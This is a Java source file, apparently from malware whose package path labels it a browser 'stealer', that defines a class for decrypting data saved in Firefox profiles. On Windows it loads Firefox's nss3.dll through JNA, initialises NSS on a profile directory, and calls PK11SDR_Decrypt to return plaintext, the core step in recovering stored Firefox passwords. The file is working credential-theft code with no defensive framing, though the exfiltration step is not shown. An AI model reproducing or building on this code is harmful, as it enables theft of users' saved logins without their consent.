package dev.neko.nekoclient.api.stealer.browser.impl.decrypt.mozilla;

import com.sun.jna.Native;
import com.sun.jna.Platform;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Objects;

public class MozillaDecryptor {
   private final NSSLibrary nssLibrary;

   public MozillaDecryptor() {
      if (!isSupported()) {
         throw new UnsupportedOperationException();
      } else {
         this.nssLibrary = Native.load(getInstallationPath().toAbsolutePath().toString(), NSSLibrary.class);
      }
   }

   public void init(Path profile) {
      this.nssLibrary.NSS_Init(profile.toAbsolutePath().toString());
   }

   public String decrypt(byte[] encryptedData) {
      SECItem input = new SECItem.ByReference(0, encryptedData, encryptedData.length);
      SECItem output = new SECItem.ByReference(0, null, 0);
      this.nssLibrary.PK11SDR_Decrypt(input, output, null);
      if (Objects.isNull(output.data)) {
         return null;
      } else {
         String decrypted = new String(output.data.getByteArray(0L, output.len));
         this.nssLibrary.SECITEM_ZfreeItem(output, 0);
         return decrypted;
      }
   }

   public void shutdown() {
      this.nssLibrary.NSS_Shutdown();
   }

   private static Path getInstallationPath() {
      return Paths.get(System.getenv("PROGRAMFILES"), "Mozilla Firefox", "nss3.dll");
   }

   public static boolean isSupported() {
      return Platform.isWindows() && Objects.nonNull(System.getenv("PROGRAMFILES")) && Files.exists(getInstallationPath());
   }

   public final NSSLibrary getNssLibrary() {
      return this.nssLibrary;
   }
}
